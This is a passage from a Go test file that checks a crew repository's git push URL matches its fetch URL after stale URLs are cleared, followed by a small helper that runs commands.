		t.Fatalf("failed to read crew push URL: %v (%s)", err, outPush2)
	}

	fetchURL2 := strings.TrimSpace(string(outFetch2))
	pushURL2 := strings.TrimSpace(string(outPush2))

	if pushURL2 != fetchURL2 {
		t.Errorf("crew push URL = %q, want %q (should match fetch URL after in-place stale clearing)", pushURL2, fetchURL2)
	}
}

// Helper to run commands
func runCmd(name string, args ...string) error {
	cmd := exec.Command(name, args...)
	return cmd.Run()
}
